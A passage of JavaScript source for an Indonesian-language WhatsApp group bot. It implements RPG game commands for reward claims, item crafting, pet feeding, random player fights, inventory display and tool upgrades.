        setTimeout(() => {
            replyReinzID('🔍Mencari Target pembunuhan.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else replyReinzID(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break
//==================================================================
case 'collect': {
  if (!m.isGroup) return reply(mess.only.group)
  function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastclaim)
    let _timers = (43200000 - __timers)
    let timers = clockString(_timers) 
    let user = global.db.users[m.sender]
    if (new Date - global.db.users[m.sender].lastclaim > 43200000) {
        replyReinzID(`Kamu sudah mengclaim dan mendapatkan *1000* 💵money dan *1* 🥤potion`)
        user.money += 1000
        user.potion += 1
        user.lastclaim = new Date * 1
    } else replyReinzID(`silahkan tunggu *${timers}* lagi untuk bisa mengclaim lagi`)
}
break

//==================================================================
case 'craft':
case 'crafting': {
  if (!m.isGroup) return reply(mess.only.group)
  let type = (args[0] || '').toLowerCase()
  let _type = (args[0] || '').toLowerCase()
  let user = global.db.users[m.sender]
  let { stock } = global.db.settings[botNumber]

  let caption = `
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█

Gunakan Format *${command} [type]*
contoh *${command} pickaxe*

*乂 List Yang Bisa Di Craft*
▧ Pickaxe ⛏️
▧ Sword ⚔️
▧ Fishingrod 🎣
▧ Armor 🥼
▧ Atm 💳

*乂 Recipe*
▧ Pickaxe ⛏️
〉 10 Kayu
〉 5 Batu
〉 5 Iron
〉 20 String

▧ Sword ⚔️
〉 10 Kayu
〉 15 Iron

▧ Fishingrod 🎣
〉 10 Kayu
〉 2 Iron
〉 20 String

▧ Armor 🥼
〉 30 Iron
〉 1 Emerald
〉 5 Diamond

▧ Atm 💳
〉3 Emerald
〉6 Diamond
〉10k Money
`
  try {
    if (/craft|Crafting/i.test(command)) {
      const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
        switch (type) {
          case 'pickaxe':
          if (user.pickaxe > 0) return replyReinzID('Kamu sudah memilik ini')
            if(user.rock < 5 || user.wood < 10 || user.iron < 5 || user.string < 20) return replyReinzID(`Barang tidak cukup!\nUntuk membuat pickaxe. Kamu memerlukan : ${user.wood < 10 ? `\n${10 - user.wood} kayu🪵` : ''} ${user.iron < 5 ? `\n${5 - user.iron} iron⛓` : ''}${user.string < 20 ? `\n${20 - user.string} String🕸️` : ''}${user.rock < 5 ? `\n${5 - user.rock} Batu 🪨` : ''}`)
            user.wood -= 10
            stock.wood += 10

            user.iron -= 5
            stock.iron += 5
        
            user.rock -= 5
            stock.rock += 5

            user.string -= 20
            stock.string += 20

            user.pickaxe += 1
            user.pickaxedurability = 40
            replyReinzID("Sukses membuat 1 pickaxe 🔨")
            break
          case 'sword':
          if (user.sword > 0) return replyReinzID('Kamu sudah memilik ini')
            if(user.wood < 10 || user.iron < 15) return replyReinzID(`Barang tidak cukup!\nUntuk membuat sword. Kamu memerlukan :${user.wood < 10 ? `\n${10 - user.wood} kayu🪵` : ''}${user.iron < 15 ? `\n${15 - user.iron} iron⛓️` : ''}`)
            user.wood -= 10
            stock.wood += 10

            user.iron -= 15
            stock.iron += 15

            user.sword += 1
            user.sworddurability = 40
            replyReinzID("Sukses membuat 1 sword 🗡️")
            break
          case 'fishingrod':
          if (user.fishingrod > 0) return replyReinzID('Kamu sudah memilik ini')
            if(user.wood < 20 || user.iron < 5 || user.string < 20) return replyReinzID(`Barang tidak cukup!\nUntuk membuat pancingan. Kamu memerlukan :${user.wood < 20 ? `\n${20 - user.wood} kayu🪵` : ''}${user.iron < 5 ? `\n${5 - user.iron} iron⛓` : ''}${user.string < 20 ? `\n${20 - user.string} String🕸️` : ''}`)
            user.wood -= 10
            stock.wood += 10

            user.iron -= 2
            stock.iron +=2

            user.string -= 20
            stock.string += 20

            user.fishingrod += 1
            user.fishingroddurability = 40
            replyReinzID("Sukses membuat 1 Pancingan 🎣")
            break
          case 'armor':
          if (user.armor > 0) return replyReinzID('Kamu sudah memilik ini')
            if(user.iron < 30 || user.emerald < 1 || user.diamond < 5) return replyReinzID(`Barang tidak cukup!\nUntuk membuat armor. Kamu memerlukan :${user.iron < 30 ? `\n${30 - user.iron} Iron ⛓️` : ''}${user.emerald < 1 ? `\n${1 - user.emerald} Emerald ❇️` : ''}${user.diamond < 5 ? `\n${5 - user.diamond} Diamond 💎` : ''}`)
            user.emerald -= 1
            stock.emerald += 1

            user.iron -= 30
            stock.iron += 30

            user.diamond -= 5
            stock.diamond += 5

            user.armor += 1
            user.armordurability = 50
            replyReinzID("Sukses membuat 1 Armor 🥼")
            break
            case 'atm':
          if (user.atm > 0) return replyReinzID('Kamu sudah memilik ini')
            if(user.emerald < 3 || user.money < 10000 || user.diamond < 6) return replyReinzID(`Barang tidak cukup!\nUntuk membuat atm. Kamu memerlukan :${user.money < 10000 ? `\n${10000 - user.money} Money 💹` : ''}${user.emerald < 3 ? `\n${3 - user.emerald} Emerald ❇️` : ''}${user.diamond < 6 ? `\n${6 - user.diamond} Diamond 💎` : ''}`)
            user.emerald -= 3
            stock.emerald += 3

            user.diamond -= 6
            stock.diamond += 6

            user.money -= 10000
            user.atm += 1
            user.fullatm = 500000000
            replyReinzID("Sukses membuat 1 Atm 💳")
            break
          default:
            return await replycraft(`${caption}`)
        }
    } 
  } catch (err) {
    reply("Error\n\n\n" + err.stack)
  }
}
break
//==================================================================
case 'feed': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
  let h = isNaN(ms) ? '--' : Math.floor(ms / 310000)
  let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
  let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
  return [h, ' H ', m, ' M ', s, ' S'].map(v => v.toString().padStart(2, 0)).join('')
}
function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)]
}

	let info = `
乂 List Pet:
🐈 • Cᴀᴛ
🐕 • Dᴏɢ
🐎 • Hᴏʀsᴇ
🦊 • Fᴏx
🤖 • Rᴏʙᴏ

*➠ Contoh:* ${command}fcat
`.trim()
let pesan = pickRandom(['ɴʏᴜᴍᴍᴍ~', 'ᴛʜᴀɴᴋs', 'ᴛʜᴀɴᴋʏᴏᴜ ^-^', '...', 'ᴛʜᴀɴᴋ ʏᴏᴜ~', 'ᴀʀɪɢᴀᴛᴏᴜ ^-^'])
    let type = (args[0] || '').toLowerCase()
    let emo = (type == 'fox' ? '🦊':'' || type == 'cat' ? '🐈':'' || type == 'dog' ? '🐕':'' || type == 'horse' ? '🐴':'' || type == 'robo'? '🤖':'' ) 
    let user = global.db.users[m.sender]
    let rubah = global.db.users[m.sender].fox
    let kuda = global.db.users[m.sender].horse
    let kucing = global.db.users[m.sender].cat
    let anjing = global.db.users[m.sender].dog
    let robot = global.db.users[m.sender].robo
    switch (type) {
        case 'fox':
            if (rubah == 0) return replyReinzID('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (rubah == 10) return replyReinzID('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __waktur = (new Date - user.foxlastfeed)
            let _waktur = (10000 - __waktur)
            let waktur = clockString(_waktur)
            if (new Date - user.foxlastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.foxexp += 20
                    user.foxlastfeed = new Date * 1
                    replyReinzID(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
                    if (rubah > 0) {
                        let naiklvl = ((rubah * 100) - 1)
                        if (user.foxexp > naiklvl) {
                            user.fox += 1
                            user.foxexp -= (rubah * 100)
                            replyReinzID(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replyReinzID(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replyReinzID(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktur}*`)
            break
        case 'cat':
            if (kucing == 0) return replyReinzID('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (kucing == 10) return replyReinzID('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __waktuc = (new Date - user.catlastfeed)
            let _waktuc = (10000 - __waktuc)
            let waktuc = clockString(_waktuc)
            if (new Date - user.catlastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.catexp += 20
                    user.catlastfeed = new Date * 1
                    replyReinzID(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
            
                    if (kucing > 0) {
                        let naiklvl = ((kucing * 100) - 1)
                        if (user.catexp > naiklvl) {
                            user.cat += 1
                            user.catexp -= (kucing * 100)
                            replyReinzID(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replyReinzID(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replyReinzID(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktuc}*`)
            break
        case 'dog':
            if (anjing == 0) return replyReinzID('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (anjing == 10) return replyReinzID('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __waktua = (new Date - user.doglastfeed)
            let _waktua = (10000 - __waktua)
            let waktua = clockString(_waktua)
            if (new Date - user.doglastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.dogexp += 20
                    user.doglastfeed = new Date * 1
                    replyReinzID(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
                    if (anjing > 0) {
                        let naiklvl = ((anjing * 100) - 1)
                        if (user.dogexp > naiklvl) {
                            user.dog += 1
                            user.dogexp -= (anjing * 100)
                            replyReinzID(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replyReinzID(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replyReinzID(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktua}*`)
            break
        case 'horse':
            if (kuda == 0) return replyReinzID('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (kuda == 10) return replyReinzID('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __waktuk = (new Date - user.horselastfeed)
            let _waktuk = (10000 - __waktuk)
            let waktuk = clockString(_waktuk)
            if (new Date - user.horselastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.horseexp += 20
                    user.horselastfeed = new Date * 1
                    replyReinzID(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
                    if (kuda > 0) {
                        let naiklvl = ((kuda * 100) - 1)
                        if (user.horseexp > naiklvl) {
                            user.horse += 1
                            user.horseexp -= (kuda * 100)
                            replyReinzID(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replyReinzID(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replyReinzID(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktuk}*`)
            break
            case 'robo':
            if (robot == 0) return replyReinzID('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
            if (robot == 10) return replyReinzID('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
            let __wakturb = (new Date - user.robolastfeed)
            let _wakturb = (10000 - __wakturb)
            let wakturb = clockString(_wakturb)
            if (new Date - user.robolastfeed > 10000) {
                if (user.petfood > 0) {
                    user.petfood -= 1
                    user.roboexp += 20
                    user.robolastfeed = new Date * 1
                    replyReinzID(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
                    if (robot > 0) {
                        let naiklvl = ((robot * 100) - 1)
                        if (user.roboexp > naiklvl) {
                            user.robo += 1
                            user.roboexp -= (robot * 100)
                            replyReinzID(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
                        }
                    }
                } else replyReinzID(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
            } else replyReinzID(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${wakturb}*`)
            break
        default:
            return replyReinzID(`${info}`)
    }
}
break
//==================================================================
case 'fighting':
 case 'fight': {
   function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
   if (!m.isGroup) return reply(mess.only.group)
    RyuuBotz.fight = RyuuBotz.fight ? RyuuBotz.fight: {}
    let user = global.db.users[m.sender]
    if (typeof RyuuBotz.fight[m.sender] != "undefined" && RyuuBotz.fight[m.sender] == true) return replyReinzID(`Kamu masih bertarung.`)
    let users = participants.map(a => a.id)
    var lawan
    lawan = users[Math.floor(users.length * Math.random())]
    while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender) {
        lawan = users[Math.floor(users.length * Math.random())]
    }
    replyReinzID(`*Kamu* (level ${user.level}) menantang *${RyuuBotz.getName(lawan)}* (level ${global.db.users[lawan].level}) dan sedang dalam pertarungan.\n\nTunggu 5 menit lagi dan lihat siapa yg menang.`)
    RyuuBotz.fight[m.sender] = true
    await delay(300000)
    let kesempatan = []
    for (let i = 0; i < user.level; i++) kesempatan.push(m.sender)
    for (let i = 0; i < global.db.users[lawan].level; i++) kesempatan.push(lawan)
    let pointPemain = 0
    let pointLawan = 0
    for (let i = 0; i < 10; i++) {
        let unggul = getRandom(0, kesempatan.length - 1)
        if (kesempatan[unggul] == m.sender) pointPemain += 1
        else pointLawan += 1
    }
    if (pointPemain > pointLawan) {
        let hadiah = (pointPemain - pointLawan) * 10000
        user.money += hadiah
        user.limit += 1
        replyReinzID(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\n*Kamu* (level ${user.level}) menang melawan *${RyuuBotz.getName(lawan)}* (level ${global.db.users[lawan].level}) karena kamu ${alasanMenang[getRandom(0, alasanMenang.length - 1)]}\n\nHadiah . ${hadiah.toLocaleString()}\n+1 Limit`)
    } else if (pointPemain < pointLawan) {
        let denda = (pointLawan - pointPemain) * 100000
        user.money -= denda
        user.limit += 1
        replyReinzID(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\n*Kamu* (level ${user.level}) kalah melawan *${RyuuBotz.getName(lawan)}* (level ${global.db.users[lawan].level}) karena kamu ${alasanKalah[getRandom(0, alasanKalah.length - 1)]}\n\nMoney kamu berkurang ${denda.toLocaleString()}\n+1 Limit`)
    } else {
        replyReinzID(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\nHasil imbang kak, ga dapet apa apa`)
    }
    delete RyuuBotz.fight[m.sender]
}
break
//==================================================================
case 'gajian': {
  if (!m.isGroup) return reply(mess.only.group)
function JaM(ms) {
  let h = isNaN(ms) ? '60' : Math.floor(ms / 3600000) % 60
  return [h].map(v => v.toString().padStart(2, 0) ).join(':')
}

function MeNit(ms) {
  let m = isNaN(ms) ? '60' : Math.floor(ms / 60000) % 60
  return [m].map(v => v.toString().padStart(2, 0) ).join(':')
}

function DeTik(ms) {
  let s = isNaN(ms) ? '60' : Math.floor(ms / 1000) % 60
  return [s].map(v => v.toString().padStart(2, 0) ).join(':')
}

  let LastClaim = global.db.users[m.sender].lastclaim
  let cdm = `${MeNit(new Date - LastClaim)}`
  let cds = `${DeTik(new Date - LastClaim)}`
  let cd1 = Math.ceil(44 - cdm)
  let cd2 = Math.ceil(59 - cds)
  if (new Date - global.db.users[m.sender].lastclaim > 2700000) {
    global.db.users[m.sender].money += 50000000
    global.db.users[m.sender].exp += 100
    replyReinzID('Nih gaji lu +Rp50000000')
    global.db.users[m.sender].lastclaim = new Date * 1
  } else return replyReinzID(`Lu udah ambil jatah hari ini.\n\nTunggu ${cd1} Menit ${cd2} Detik!`)
}
break
//==================================================================
case 'me':
case 'inventory': {
  if (!m.isGroup) return reply(mess.only.group)
let inventory = {
  others: {
    joinlimit: true,
    health: true,
    money: true,
    chip: true,
    exp: true,
  },
  items: {
    bibitanggur: true,
    bibitmangga: true,
    bibitpisang: true,
    bibitapel: true,
    bibitjeruk: true,
    anggur: true,
    mangga: true,
    pisang: true,
    apel: true,
    jeruk: true,
    potion: true,
    trash: true,
    wood: true,
    rock: true,
    string: true,
    emerald: true,
    diamond: true,
    gold: true,
    iron: true,
    umpan: true,
    upgrader: true,
    pet: true,
    petfood: true,
  },
  durabi: {
    sworddurability: true,
    pickaxedurability: true,
    fishingroddurability: true,
    armordurability: true,
  },
  tools: {
    armor: {
      '0': '❌',
      '1': 'Leather Armor',
      '2': 'Iron Armor',
      '3': 'Gold Armor',
      '4': 'Diamond Armor',
      '5': 'Emerald Armor',
      '6': 'Crystal Armor',
      '7': 'Obsidian Armor',
      '8': 'Netherite Armor',
      '9': 'Wither Armor',
      '10': 'Dragon Armor',
      '11': 'Hacker Armor'
    },
    sword: {
      '0': '❌',
      '1': 'Wooden Sword',
      '2': 'Stone Sword',
      '3': 'Iron Sword',
      '4': 'Gold Sword',
      '5': 'Copper Sword',
      '6': 'Diamond Sword',
      '7': 'Emerald Sword',
      '8': 'Obsidian Sword',
      '9': 'Netherite Sword',
      '10': 'Samurai Slayer Green Sword',
      '11': 'Hacker Sword'
    },
    pickaxe: {
      '0': '❌',
      '1': 'Wooden Pickaxe',
      '2': 'Stone Pickaxe',
      '3': 'Iron Pickaxe',
      '4': 'Gold Pickaxe',
      '5': 'Copper Pickaxe',
      '6': 'Diamond Pickaxe',
      '7': 'Emerlad Pickaxe',
      '8': 'Crystal Pickaxe',
      '9': 'Obsidian Pickaxe',
      '10': 'Netherite Pickaxe',
      '11': 'Hacker Pickaxe'
    },
    fishingrod: {
      '0': '❌',
      '1': 'Wooden Fishingrod',
      '2': 'Stone Fishingrod',
      '3': 'Iron Fishingrod',
      '4': 'Gold Fishingrod',
      '5': 'Copper Fishingrod',
      '6': 'Diamond Fishingrod',
      '7': 'Emerald Fishingrod',
      '8': 'Crystal Fishingrod',
      '9': 'Obsidian Fishingrod',
      '10': 'God Fishingrod',
      '11': 'Hacker Fishingrod'
     }
  },
  crates: {
    common: true,
    uncommon: true,
    mythic: true,
    legendary: true,
  },
  pets: {
    horse: 10,
    cat: 10,
    fox: 10,
    dog: 10,
    robo: 10,
  },
  cooldowns: {}
}

  let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? RyuuBotz.user.jid : m.sender
  let user = global.db.users[who]

  if (!(who in global.db.users)) return replyReinzID(`User ${who} not in database`)

  let sortedlevel = Object.entries(global.db.users).sort((a, b) => b[1].level - a[1].level)
  let userslevel = sortedlevel.map(v => v[0])
  let sortedchip = Object.entries(global.db.users).sort((a, b) => b[1].chip - a[1].chip)
  let userschip = sortedchip.map(v => v[0])
  let sortedmoney = Object.entries(global.db.users).sort((a, b) => b[1].money - a[1].money)
  let usersmoney = sortedmoney.map(v => v[0])
  let sorteddiamond = Object.entries(global.db.users).sort((a, b) => b[1].diamond - a[1].diamond)
  let usersdiamond = sorteddiamond.map(v => v[0])
  let sortedbank = Object.entries(global.db.users).sort((a, b) => b[1].bank - a[1].bank)
  let usersbank = sortedbank.map(v => v[0])
  let sortedgold = Object.entries(global.db.users).sort((a, b) => b[1].gold - a[1].gold)
  let usersgold = sortedgold.map(v => v[0])

  let isMods = [RyuuBotz.decodeJid(RyuuBotz.user.id), ...global.owner.filter(([number, _, isDeveloper]) => number && isDeveloper).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
  let isRyuuTheCreator = m.fromMe || isMods || [RyuuBotz.decodeJid(RyuuBotz.user.id), ...global.owner.filter(([number, _, isDeveloper]) => number && !isDeveloper).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
  let isPrems =  isRyuuTheCreator || new Date() - user.premiumTime < 0

  let limit = isPrems ? 'Unlimited' : user.limit
  let tools = Object.keys(inventory.tools).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${typeof inventory.tools[v] === 'object' ? inventory.tools[v][user[v]?.toString()] : `Level(s) ${user[v]}`}`).filter(v => v).join('\n').trim()
  let items = Object.keys(inventory.items).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`).filter(v => v).join('\n').trim()
  let dura = Object.keys(inventory.durabi).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`).filter(v => v).join('\n').trim()
  let crates = Object.keys(inventory.crates).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`).filter(v => v).join('\n').trim()
  let pets = Object.keys(inventory.pets).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v] >= inventory.pets[v] ? 'Max Levels' : `Level(s) ${user[v]}`}`).filter(v => v).join('\n').trim()
  let cooldowns = Object.entries(inventory.cooldowns).map(([cd, { name, time }]) => cd in user && `*✧ ${name}*: ${new Date() - user[cd] >= time ? '✅' : '❌'}`).filter(v => v).join('\n').trim()

  let caption = `
🧑🏻‍🏫 ᴜsᴇʀ: *${user.registered ? user.name : RyuuBotz.getName(who)}* ${user.level ? `
➠ ${global.rpg.emoticon('level')} level: ${user.level}` : ''} ${user.limit ? `
➠ ${global.rpg.emoticon('limit')} limit: ${limit}` : ''}
${Object.keys(inventory.others).map(v => user[v] && `➠ ${global.rpg.emoticon(v)} ${v}: ${user[v]}`).filter(v => v).join('\n')} ${tools ? `

*ʟɪꜱᴛ ᴛᴏᴏʟs* :
${tools}` : ''}${items ? `

*ʟɪꜱᴛ ɪᴛᴇᴍs* :
${items}` : ''}${crates ? `

*ʟɪꜱᴛ ᴄʀᴀᴛᴇs* :
${crates}` : ''}${pets ? `

*ʟɪꜱᴛ ᴩᴇᴛs* :
${pets}` : ''}${cooldowns ? `

*ʟɪꜱᴛ ᴀʀᴄʜɪᴇᴠᴇᴍᴇɴᴛ* :
${global.rpg.emoticon('chip')} ᴛᴏᴘ ᴄʜɪᴘ *${userschip.indexOf(who) + 1}* ᴅᴀʀɪ *${userschip.length}*
${global.rpg.emoticon('money')} ᴛᴏᴘ ᴍᴏɴᴇʏ *${usersmoney.indexOf(who) + 1}* ᴅᴀʀɪ *${usersmoney.length}*
${global.rpg.emoticon('bank')} ᴛᴏᴘ ʙᴀɴᴋ *${usersbank.indexOf(who) + 1}* ᴅᴀʀɪ *${usersbank.length}*
${global.rpg.emoticon('level')} ᴛᴏᴘ ʟᴇᴠᴇʟ *${userslevel.indexOf(who) + 1}* ᴅᴀʀɪ *${userslevel.length}*
${global.rpg.emoticon('diamond')} ᴛᴏᴘ ᴅɪᴀᴍᴏɴᴅ *${usersdiamond.indexOf(who) + 1}* ᴅᴀʀɪ *${usersdiamond.length}*
${global.rpg.emoticon('gold')} ᴛᴏᴘ ɢᴏʟᴅ *${usersgold.indexOf(who) + 1}* ᴅᴀʀɪ *${usersgold.length}*

♻️ *ᴄᴏʟʟᴇᴄᴛ ʀᴇᴡᴀʀᴅs* :
${cooldowns}` : ''}
*✧ dungeon: ${user.lastdungeon == 0 ? '✅': '❌'}*
*✧ mining: ${user.lastmining == 0 ? '✅': '❌'}*
`.trim()

    replyme(`${caption}`)
}
break
//==================================================================
case 'upgrade': {
  if (!m.isGroup) return reply(mess.only.group)
        let user = global.db.users[m.sender]
        let wood = user.wood * 1
        let rock = user.rock * 1
        let string = user.string * 1
        let money = user.money * 1
        let iron = user.iron * 1
        let fishingrod = user.fishingrod * 1
        let pickaxe = user.pickaxe * 1
        let sword = user.sword * 1
        let diamond = user.diamond * 1
        let emerald = user.emerald * 1
        let armor = user.armor * 1
        let atm = user.atm
        let type = (args[0] || '').toLowerCase()
        let prefix = command
        
        let teks = `█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█

Gunakan Format *${command} [type]*
contoh *${command} fishingRod*

*📌List yang Bisa Di Upgrade*
${rpg.emoticon('fishingrod')}FishingRod
${rpg.emoticon('pickaxe')}Pickaxe
${rpg.emoticon('sword')}Sword
${rpg.emoticon('armor')}Armor
${rpg.emoticon('atm')}Atm
`.trim()
        
        switch (type) {
            case 'fishingrod':
                if (fishingrod == 0) {
                    let lmao = `anda belum memiliki *🎣FishingRod*
untuk mendapatkannya ketik *${command}craft fishingrod*`
                    return reply(`${lmao}`)
                }
                if (fishingrod > 9) return reply(`*${rpg.emoticon('fishingrod')}FishingRod* kamu sudah level max`)
                let _wood = fishingrod * 100
                let _string = fishingrod * 100
                let _money = fishingrod * 1000000
                if (wood < _wood || string < _string || money < _money) return reply(`Material kamu kurang!!${wood < _wood ? `\n${rpg.emoticon('wood')}wood Kamu Kurang *${_wood - wood}*` : ''}${string < _string ? `\n${rpg.emoticon('string')}String Kamu Kurang *${_string - string}*` : ''}${user.money < _money ? `\n${rpg.emoticon('money')}Uang Kamu Kurang *${_money - money}*` : ''}`)
                user.fishingrod += 1
                user.wood -= _wood * 1
                user.string -= _string * 1
                user.money -= _money * 1
                user.fishingroddurability = 0 
                user.fishingroddurability += fishingrod * 50
                reply(`Succes mengupgrade *${rpg.emoticon('fishingrod')}FishingRod*`)
                break
            case 'pickaxe':
                if (pickaxe == 0) {
                    let lmao = `anda belum memiliki *${rpg.emoticon('pickaxe')}Pickaxe*
untuk memilikinya ketik *${command}craft Pickaxe*`
                    return reply(`${lmao}`)
                }
                if (pickaxe > 9) return reply(`*${rpg.emoticon('pickaxe')}Pickaxe* kamu sudah level max!!`)
                let __rock = pickaxe * 250
                let __wood = pickaxe * 150
                let __money = pickaxe * 1500000
                if (rock < __rock || wood < __wood || money < __money) return reply(`
Material Anda Kurang!!
${rock < __rock ? `\n${rpg.emoticon('rock')}rock kamu kurang *${__rock - rock}*` : ''}${wood < __wood ? `\n${rpg.emoticon('wood')}wood kamu kurang *${__wood - wood}*` : ''}${money < __money ? `\n${rpg.emoticon('money')}Uang kamu kurang *${__money - money}*` : ''}`)
                user.pickaxe += 1
                user.wood -= __wood * 1
                user.rock -= __rock * 1
                user.money -= __money * 1
                user.pickaxedurability = 0
                user.pickaxedurability += pickaxe * 50
                reply(`Succes mengupgrade *${rpg.emoticon('pickaxe')}Pickaxe*`)
                break
            case 'sword':
                if (sword == 0) {
                    let lmao = `anda belum memiliki *${rpg.emoticon('sword')}Sword*
untuk memilikinya ketik *${command}craft sword*`
                    return reply(`${lmao}`)
                }
                if (sword > 9) return reply(`*${rpg.emoticon('sword')}Sword* kamu sudah level max!!`)
                let _iron = sword * 250
                let ___wood = sword * 150
                let ___money = sword * 1000000
                if (iron < _iron || wood < ___wood || money < ___money) return reply(`
Material Anda Kurang!!
